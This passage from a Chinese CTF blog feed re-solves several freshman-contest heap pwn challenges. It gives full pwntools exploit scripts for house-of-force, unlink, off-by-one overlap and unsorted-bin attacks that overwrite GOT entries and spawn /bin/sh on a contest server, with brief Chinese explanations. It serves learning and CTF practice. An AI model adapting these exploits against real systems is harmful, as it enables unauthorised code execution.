class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D1B</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc = offset_to_heap_base - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(malloc,<span class="string">"dddd"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic) * <span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>负向申请然后打过去，然后这里应该可以只要申请足够大 然后把里面内容全覆盖为后门函数 直接调用应该都可以</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>可以去看我刚总结的堆</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/unlink_smallbin_intro.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"><span class="meta">#coding=utf-8</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">#context.log_level = 'debug'</span><br><span class="line">p = process('./pwn5')</span><br><span class="line">#p = remote('219.219.61.234','10014')</span><br><span class="line">elf = ELF('./pwn5')</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line">def add(<span class="built_in">size</span>,con):</span><br><span class="line">p.sendlineafter('Your choice:','2')</span><br><span class="line">p.sendlineafter('Plz input the size of item name:',str(size))</span><br><span class="line">p.sendafter('Plz input the name:',con)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter('Your choice:','4')</span><br><span class="line">p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter('Your choice:','1')</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">change</span><span class="params">(idx,<span class="built_in">size</span>,con)</span>:</span></span><br><span class="line">    p.sendlineafter('Your choice:','3')</span><br><span class="line">    p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class="line">    p.sendlineafter('Plz enter the length of item name:',str(size))</span><br><span class="line">    p.sendafter('Plz enter the new name of the item:',con)</span><br><span class="line">buf = <span class="number">0x06020b8</span></span><br><span class="line">sys = <span class="number">0x400D1B</span></span><br><span class="line">add(0x60,'ccc')</span><br><span class="line">add(0x58,'aaa')</span><br><span class="line">add(0x80,'bbb')</span><br><span class="line">add(0x60,'eee')</span><br><span class="line">add(0x60,'fff')</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)</span><br><span class="line">payload += p64(buf - <span class="number">0x18</span>) </span><br><span class="line">payload += p64(buf - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0x50</span>)+p8(<span class="number">0x90</span>) </span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x40</span>,p64(<span class="number">0x60</span>)*<span class="number">3</span>+ p64(<span class="number">0x6020a8</span>))</span><br><span class="line">change(1,0x40,p64(elf.got['free']))</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x40</span>,p64(sys)*<span class="number">2</span>)</span><br><span class="line"><span class="meta"># delete(3)</span></span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h1><blockquote><p>change函数中存在单字节溢出漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;if ( heap[v1] ) </span><br><span class="line">&gt;&#123; printf(&quot;Content of heap : &quot;);</span><br><span class="line">read_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class="line">puts(&quot;Done !&quot;); </span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>利用单字节溢出漏洞构造fake_chunk,free之后再次分配造成overlap,从而任意地址读写</p><p>泄露出libc基地址，修改got表，最后get_shell</p></blockquote><p>毕竟一开始做堆题，上来先分析，尽量详细点</p><blockquote><p>add函数</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219204952738.png" alt="image-20201219204952738"></p><p>其中数据结构为</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205027638.png" alt="image-20201219205027638"></p><p>change函数</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205113774.png" alt="image-20201219205113774"></p></blockquote><p>直接看exp分析吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10015</span>)</span><br><span class="line">heap = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>先说一下思路</p><ul><li>单字节溢出，我们可以通过修改chunk_size来overlap，达到任意读写的目的</li><li>由于后门函数没有，所以我们就应该想调用system函数，首要的就是泄露libc基址，其次获取system函数</li><li>改free的got表 达到调用</li></ul><p>这里来写一下exp的思路</p><ol><li>先申请两个堆块，之后修改第一个堆块，第一个堆块可以写入/bin/sh的参数，然后我们修改第二个堆块的size，使其进入fastbin中，让我们再次分配</li><li>我们进行重新分配，这是就可以任意写，把got表中的free写进去，然后读出来，泄露基址</li><li>修改free的got表为system的地址然后直接free(0)也就调用了/bin/sh</li></ol><p>下面是关键截图</p><p>写入/bin/sh</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211422639.png" alt="image-20201220211422639"></p><p>释放1之后</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211752814.png" alt="image-20201220211752814"></p></blockquote><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>这里说一下我自己的问题</p><p>我一直认为fakechunk被释放后进入fastbin中，我一直认为fastbin中只有一个chunk</p><p>知道我惊人地发现它居然是free了两回是两个chunk </p><p>我才醒悟</p><p>为什么它不直接从top chunk中分配（我个fw，盯着看了两个小时也没看出来）</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223150743.png" alt="image-20201220223150743"></p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223239931.png" alt="image-20201220223239931"></p><p>总结，自己总是在自己想这个堆怎么运行，很少去调试。还是应该多动手（要不是我调试能力不太行）</p><h1 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h1><blockquote><p>很简单的unsorted bin attack,利用此攻击修改flag为一个很大的数就可以获得shell了</p><p>关于unsorted bin attack可以参考这篇文章</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10016</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def show(idx):</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline("3")</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline(str(idx))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = flag - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"666"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h1><blockquote><p>add申请的时候,如果size不符合条件,会返回,而edit的时候,没有检测,所以通过残留信息来控制指针,实现</p><p>任意写</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;复现&quot;&gt;&lt;a href=&quot;#复现&quot; class=&quot;headerlink&quot; title=&quot;复现&quot;&gt;&lt;/a&gt;复现&lt;/h1&gt;&lt;p&gt;终于考完试了，这考前学真不是人干的，上课还是得听一听&lt;/p&gt;
&lt;p&gt;复现一下这几道题，顺便学习堆的知识&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;淦 我是fw</summary>
      
    
    
    
    <category term="复现" scheme="https://pz1o.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="堆" scheme="https://pz1o.top/tags/%E5%A0%86/"/>
    
    <category term="复现" scheme="https://pz1o.top/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
</feed>
